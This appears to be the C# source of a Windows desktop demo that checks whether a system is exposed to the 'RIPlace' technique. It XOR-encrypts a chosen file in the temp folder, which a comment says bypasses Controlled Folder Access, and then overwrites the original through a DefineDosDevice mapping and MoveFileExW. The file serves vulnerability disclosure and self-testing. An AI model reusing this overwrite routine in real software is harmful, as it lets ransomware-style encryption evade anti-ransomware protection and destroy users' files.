using System;
using System.ComponentModel;
using System.Diagnostics;
using System.Drawing;
using System.IO;
using System.Runtime.InteropServices;
using System.Windows.Forms;

namespace RIPlaceDemoSharp
{
    public partial class MainForm : Form
    {
        [DllImport("kernel32.dll", CharSet = CharSet.Unicode, SetLastError = true)]
        private static extern bool DefineDosDeviceW(uint dwFlags, string lpDeviceName, string lpTargetPath);

        [DllImport("kernel32.dll", CharSet = CharSet.Unicode, SetLastError = true)]
        internal static extern bool MoveFileExW(string lpExistingFileName, string lpNewFileName, uint dwFlags);
        
        private const uint DDD_RAW_TARGET_PATH = 0x00000001;
        private const uint DDD_REMOVE_DEFINITION = 0x00000002;

        private const uint MOVEFILE_REPLACE_EXISTING = 0x00000001;
        private const uint MOVEFILE_WRITE_THROUGH = 0x00000008;

        private const string _dosDevName = "RIPlace";
        private const string _dosDevPath = @"\\.\" + _dosDevName;
        
        private const string _key = "riplace.fyi";

        private bool _clearTextProgrammatically = false;
        private const string _instructions = "To start, either manually enter a path or drag and drop a file onto this window.";

        private enum Status { Ready, OK, Fail, Error }

        private Status _currentStatus = Status.Ready;
        private string _lastPath = string.Empty;
        private string _lastError = string.Empty;

        public MainForm()
        {
            InitializeComponent();
            
            ChangeStatus(Status.Ready, true);
            ShowInstructions(true);
        }

        private void ChangeStatus(Status status, bool force = false)
        {
            if (!force && status == _currentStatus)
                return;

            _currentStatus = status;

            lnkLearnMore.Visible = !(status == Status.Ready);

            switch (status)
            {
                case Status.Ready:
                    picStatus.Image = Properties.Resources.ready;
                    lblStatus.Text = "Ready to launch.";
                    break;
                case Status.OK:
                    picStatus.Image = Properties.Resources.ok;
                    lblStatus.Text = "Based on the selected file, your system may be exposed to the RIPlace technique.";
                    break;
                case Status.Fail:
                    picStatus.Image = Properties.Resources.fail;
                    lblStatus.Text = "The attempt to overwrite the selected file was unsuccessful.\n" + _lastError;
                    break;
                case Status.Error:
                    picStatus.Image = Properties.Resources.error;
                    lblStatus.Text = "Error occurred; failed to execute test (click to show details).";
                    break;
                default:
                    break;
            }
        }

        private bool IsFilePathValid(string filePath)
        {
            if (string.IsNullOrEmpty(filePath) || string.IsNullOrWhiteSpace(filePath))
                return false;

            if (!File.Exists(filePath))
                return false;

            return true;
        }

        private string GetAllExceptionMessages(ref Exception ex)
        {
            if (ex == null)
                return string.Empty;

            string exceptionMessages = string.Empty;
            do
            {
                exceptionMessages += ex.Message + "\n";
            } while ((ex = ex.InnerException) != null);

            return exceptionMessages;
        }

        void SetLastErrorMessage(string failedFunction, int errorCode)
        {
            if (string.IsNullOrEmpty(failedFunction) || string.IsNullOrWhiteSpace(failedFunction))
                return;

            if (errorCode == 0)
                _lastError = "Error: " + failedFunction;
            else
                _lastError = string.Format("Error: " + failedFunction + " failed (0x{0:X8} - " + (new Win32Exception(errorCode).Message) + ")", errorCode);
        }

        void SetLastErrorMessage(string errorMessage)
        {
            SetLastErrorMessage(errorMessage, 0);
        }

        private bool PrepareToRIPlace(string targetFilePath, out string encryptedFilePath)
        {
            encryptedFilePath = string.Empty;

            if (!IsFilePathValid(targetFilePath))
            {
                SetLastErrorMessage("Path is either empty or points to a non-existing file.");
                return false;
            }
            byte[] buffer;

            try
            {
                buffer = File.ReadAllBytes(targetFilePath);
            }
            catch (Exception ex)
            {
                SetLastErrorMessage("Failed to read target file.\n" + GetAllExceptionMessages(ref ex));
                return false;
            }

            if (buffer.Length <= 0)
            {
                SetLastErrorMessage("Target file should not be empty.");
                return false;
            }
            for (int i = 0; i < buffer.Length; i++)
            {
                buffer[i] ^= (byte)_key[i % _key.Length];
            }

            string currentDir = string.Empty;
            try
            {
                //currentDir = Path.GetDirectoryName(System.Reflection.Assembly.GetExecutingAssembly().Location) + "\\";
                currentDir = Path.GetTempPath() + "\\"; // this replaces the above to bypass CFA (create encryped file in temp folder)
            }
            catch (Exception ex)
            {
                SetLastErrorMessage("Failed to get current directory.\n" + GetAllExceptionMessages(ref ex));
                return false;
            }

            string guid;

            do
            {
                guid = Guid.NewGuid().ToString();
            } while (File.Exists(currentDir + guid));

            encryptedFilePath = currentDir + guid;
            try
            {
                File.WriteAllBytes(encryptedFilePath, buffer);
            }
            catch (Exception ex)
            {
                SetLastErrorMessage("Failed to write encrypted file.\n" + GetAllExceptionMessages(ref ex));
                return false;
            }

            return true;
        }

        private void Cleanup(string fileToDelete = null)
        {
            DefineDosDeviceW(DDD_REMOVE_DEFINITION | DDD_RAW_TARGET_PATH, _dosDevName, string.Empty);

            if (!IsFilePathValid(fileToDelete))
                return;

            try
            {
                File.Delete(fileToDelete);
            }
            catch
            {
                ; // I don't care
            }
        }

        private bool RIPlace(string sourceFilePath, string destinationFilePath)
        {
            if (!DefineDosDeviceW(DDD_RAW_TARGET_PATH, _dosDevName, @"\??\" + destinationFilePath))
            {
                SetLastErrorMessage("DefineDosDevice", Marshal.GetLastWin32Error());
                return false;
            }

            if (!MoveFileExW(sourceFilePath, _dosDevPath, MOVEFILE_REPLACE_EXISTING | MOVEFILE_WRITE_THROUGH))
            {
                SetLastErrorMessage("MoveFileEx", Marshal.GetLastWin32Error());
                return false;
            }

            return true;
        }

        void ShowInstructions(bool show, bool overwriteText = true)
        {
            if (overwriteText)
            {
                if (!show)
                {
                    _clearTextProgrammatically = true;
                }
                txtPath.Text = show ? _instructions : "";
                ChangeStatus(Status.Ready);
            }
            txtPath.ForeColor = show ? SystemColors.GrayText : SystemColors.WindowText;
            txtPath.SelectionStart = (txtPath.Text == _instructions) ? 0 : txtPath.Text.Length;
            txtPath.SelectionLength = 0;
        }

        private void txtPath_DragEnter(object sender, DragEventArgs e)
        {
            if (e.Data.GetDataPresent(DataFormats.FileDrop))
                e.Effect = DragDropEffects.Copy;
            else
                e.Effect = DragDropEffects.None;
        }

        private void txtPath_DragDrop(object sender, DragEventArgs e)
        {
            string[] filePaths = (string[])e.Data.GetData(DataFormats.FileDrop, false);

            if (filePaths.Length < 1)
            {
                e.Effect = DragDropEffects.None;
                return;
            }

            if (!IsFilePathValid(filePaths[0]))
            {
                e.Effect = DragDropEffects.None;
                return;
            }

            txtPath.Text = filePaths[0];
        }

        private void txtPath_KeyDown(object sender, KeyEventArgs e)
        {
            if (!(e.Control && e.KeyCode == Keys.V))
                return;

            e.SuppressKeyPress = true;

            string clipboard = string.Empty;

            if (Clipboard.ContainsText())
            {
                clipboard = Clipboard.GetText().Replace("\"", "");
            }
            else if (Clipboard.ContainsFileDropList())
            {
                var list = Clipboard.GetFileDropList();
                if (list.Count <= 0)
                    return;

                clipboard = list[0].Replace("\"", "");
            }
            else
            {
                return;
            }

            if (!IsFilePathValid(clipboard))
                return;

            ShowInstructions(false);
            txtPath.Text = clipboard;
        }

        private void txtPath_KeyPress(object sender, KeyPressEventArgs e)
        {
            if (txtPath.Text != _instructions)
                return;

            ShowInstructions(false);
        }

        private void txtPath_TextChanged(object sender, EventArgs e)
        {
            btnTest.Enabled = File.Exists(txtPath.Text);

            if (string.IsNullOrEmpty(txtPath.Text) || string.IsNullOrWhiteSpace(txtPath.Text))
            {
                if (_clearTextProgrammatically)
                {
                    _clearTextProgrammatically = false;
                    return;
                }

                ShowInstructions(true);
                return;
            }

            ShowInstructions(false, false);

            if (string.IsNullOrEmpty(_lastPath) || string.IsNullOrWhiteSpace(_lastPath)
                || txtPath.Text == _lastPath || !IsFilePathValid(txtPath.Text) || _currentStatus == Status.Ready)
            {
                return;
            }

            ChangeStatus(Status.Ready);
        }

        private void btnTest_Click(object sender, EventArgs e)
        {
            if (!IsFilePathValid(txtPath.Text))
                return;

            string confirmation = "Are you sure you want to overwrite \"" + txtPath.Text + "\"?\n"
            + "If you choose to continue, the tool will attempt to encrypt this file with a simple XOR cipher.\n"
            + "To decrypt the file, just re-run the tool for the same file.";
            DialogResult dr = MessageBox.Show(confirmation, "Are you sure?", MessageBoxButtons.YesNo, MessageBoxIcon.Warning, MessageBoxDefaultButton.Button2);

            if (dr != DialogResult.Yes)
                return;

            Cleanup();

            _lastPath = txtPath.Text;

            string encryptedFilePath = string.Empty;

            if (!PrepareToRIPlace(txtPath.Text, out encryptedFilePath))
            {
                Cleanup(encryptedFilePath);
                ChangeStatus(Status.Error);
                return;
            }

            if (!RIPlace(encryptedFilePath, txtPath.Text))
            {
                Cleanup(encryptedFilePath);
                ChangeStatus(Status.Fail);
                return;
            }

            Cleanup();
            ChangeStatus(Status.OK);
            return;
        }

        private void lblStatus_Click(object sender, EventArgs e)
        {
            if (string.IsNullOrEmpty(_lastError) || string.IsNullOrWhiteSpace(_lastError)
                || _currentStatus != Status.Error)
                return;

            MessageBox.Show(_lastError, "Details", MessageBoxButtons.OK);
        }

        private void lnkLearnMore_LinkClicked(object sender, LinkLabelLinkClickedEventArgs e)
        {
            switch (_currentStatus)
            {
                case Status.Ready:
                    Process.Start("http://riplace.fyi"); // shouldn't happen
                    break;
                case Status.OK:
                    Process.Start("http://riplace.fyi/o");
                    break;
                case Status.Fail:
                    Process.Start("http://riplace.fyi/f");
                    break;
                case Status.Error:
                    Process.Start("http://riplace.fyi/e");
                    break;
                default:
                    break;
            }
        }
    }
}
